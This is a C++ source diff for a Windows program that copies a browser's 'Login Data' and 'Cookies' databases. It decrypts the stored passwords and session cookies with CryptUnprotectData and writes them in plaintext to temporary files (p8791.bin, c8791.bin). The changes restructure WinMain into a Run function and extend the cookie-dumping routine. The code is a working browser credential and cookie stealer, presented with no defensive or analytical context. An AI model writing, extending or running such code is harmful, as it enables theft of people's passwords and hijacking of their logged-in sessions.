@@ -88,7 +88,7 @@ stringstream getCookies(
 	sqlite3 *db
 ) {
 	stringstream dump(string("")); // String stream for our output
-	const char *zSql = "SELECT HOST_KEY,path,encrypted_value from cookies";
+	const char *zSql = "SELECT HOST_KEY,path,encrypted_value,expires_utc from cookies";
 	sqlite3_stmt *pStmt;
 	int rc;
 
@@ -104,35 +104,41 @@ stringstream getCookies(
 	** only. Normally, we would keep calling sqlite3_step until it
 	** returned something other than SQLITE_ROW.
 	*/
+	int expires = sqlite3_column_int(pStmt, 3);
+
 	rc = sqlite3_step(pStmt);
 	cout << "RC: " << rc << endl;
 	while (rc == SQLITE_ROW) {
-		dump << sqlite3_column_text(pStmt, 0) << endl;
-		dump << (char *)sqlite3_column_text(pStmt, 1) << endl;
+		string decrypted("<failed>");
 
 		DATA_BLOB encryptedPass, decryptedPass;
+		try {
+			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
+			encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
 
-		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
-		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
+			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
 
-		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
-
-		CryptUnprotectData(
-			&encryptedPass, // In Data
-			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
-			NULL,           // Optional entropy
-			NULL,           // Reserved
-			NULL,           // Here, the optional
-							// prompt structure is not
-							// used.
-			0,
-			&decryptedPass);
-		char *c = (char *)decryptedPass.pbData;
-		while (isprint(*c)) {
-			dump << *c;
-			c++;
+			CryptUnprotectData(
+				&encryptedPass, // In Data
+				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
+				NULL,           // Optional entropy
+				NULL,           // Reserved
+				NULL,           // Here, the optional
+								// prompt structure is not
+								// used.
+				0,
+				&decryptedPass);
+			decrypted = string((char *)decryptedPass.pbData, decryptedPass.cbData);
 		}
+		catch (...)
+		{
+		}
+
 		dump << endl;
+		dump << "Host   :" << sqlite3_column_text(pStmt, 0) << endl;
+		dump << "Path   :" << (char *)sqlite3_column_text(pStmt, 1) << endl;
+		dump << "Expires:" << expires << endl;
+		dump << "Cookie :" << decrypted << endl;
 		rc = sqlite3_step(pStmt);
 	}
 
@@ -182,6 +188,95 @@ int deleleteDB(const char *fileName) {
 
 	return 0;
 }
+
+void Run(LPSTR lpCmdLine)
+{
+	{
+		std::istringstream ss(lpCmdLine);
+		std::istream_iterator<std::string> begin(ss), end;
+
+		//putting all the tokens in the vector
+		std::vector<std::string> arrayTokens(begin, end);
+
+		std::vector<const char*> argv;
+		for (std::vector<std::string>::iterator itr = arrayTokens.begin(); itr != arrayTokens.end(); itr++)
+		{
+			argv.push_back((*itr).c_str());
+		}
+
+		int argc = argv.size();
+
+		int rc;
+		try
+		{
+
+			// Open Database
+			cout << "Copying db ..." << endl;
+			copyDB("Login Data", "passwordsDB");
+			sqlite3 *passwordsDB = getDBHandler("passwordsDB");
+			stringstream passwords = getPass(passwordsDB);
+			//	cout << passwords.str();
+
+			string fileName = getenv("LOCALAPPDATA");
+			fileName.append("\\Temp\\");
+			fileName.append("p8791.bin");
+			std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
+			myfile << passwords.str();
+			myfile.close();
+
+			if (sqlite3_close(passwordsDB) == SQLITE_OK)
+				cout << "DB connection closed properly" << endl;
+			else
+				cout << "Failed to close DB connection" << endl;
+
+		}
+		catch(...)
+		{
+
+		}
+
+		bool flagCookies = false, flagPause = false;
+		for (int i = 0; i < argc; i++) {
+			if (strlen(argv[i]) < 2)continue;
+			switch (argv[i][1]) {
+			case 'c':
+				flagCookies = true;
+				break;
+			case 'p':
+				flagPause = true;
+				break;
+			}
+		}
+		if (flagCookies) {
+			try
+			{
+				copyDB("Cookies", "cookiesDB");
+				sqlite3 *cookiesDb = getDBHandler("cookiesDB");
+				stringstream cookies = getCookies(cookiesDb);
+
+				string fileName = getenv("LOCALAPPDATA");
+				fileName.append("\\Temp\\");
+				fileName.append("c8791.bin");
+				std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
+				myfile << cookies.str();
+				myfile.close();
+
+				if (sqlite3_close(cookiesDb) == SQLITE_OK)
+					cout << "DB connection closed properly" << endl;
+				else
+					cout << "Failed to close DB connection" << endl;
+			}
+			catch(...)
+			{
+
+			}
+		}
+
+		if (!flagPause)
+			cin.get();
+	}
+}
+
 int WinMain(
 	HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
@@ -189,64 +284,6 @@ int WinMain(
 	int       nShowCmd
 )
 {
-	std::istringstream ss(lpCmdLine);
-	std::istream_iterator<std::string> begin(ss), end;
-
-	//putting all the tokens in the vector
-	std::vector<std::string> arrayTokens(begin, end);
-
-	std::vector<const char*> argv;
-	for (std::vector<std::string>::iterator itr = arrayTokens.begin(); itr != arrayTokens.end(); itr++)
-	{
-		argv.push_back((*itr).c_str());
-	}
-
-	int argc = argv.size();
-
-	int rc;
-	// Open Database
-	cout << "Copying db ..." << endl;
-	copyDB("Login Data", "passwordsDB");
-	sqlite3 *passwordsDB = getDBHandler("passwordsDB");
-	stringstream passwords = getPass(passwordsDB);
-//	cout << passwords.str();
-
-	string fileName = getenv("LOCALAPPDATA");
-	fileName.append("\\Temp\\");
-	fileName.append("p8791.bin");
-	std::ofstream myfile(fileName, std::ios::out | std::ios::app | std::ios::binary);
-	myfile << passwords.str();
-	myfile.close();
-
-	if (sqlite3_close(passwordsDB) == SQLITE_OK)
-		cout << "DB connection closed properly" << endl;
-	else
-		cout << "Failed to close DB connection" << endl;
-
-	bool flagCookies = false, flagPause = false;
-	for (int i = 0; i < argc; i++) {
-		if (strlen(argv[i]) < 2)continue;
-		switch (argv[i][1]) {
-		case 'c':
-			flagCookies = true;
-			break;
-		case 'p':
-			flagPause = true;
-			break;
-		}
-	}
-	if (flagCookies) {
-		copyDB("Cookies", "cookiesDB");
-		sqlite3 *cookiesDb = getDBHandler("cookiesDB");
-		stringstream cookies = getCookies(cookiesDb);
-	// TODO	cout << cookies.str();
-		if (sqlite3_close(cookiesDb) == SQLITE_OK)
-			cout << "DB connection closed properly" << endl;
-		else
-			cout << "Failed to close DB connection" << endl;
-	}
-
-	if (!flagPause)
-		cin.get();
+	Run(lpCmdLine);
 	return 0;
 }
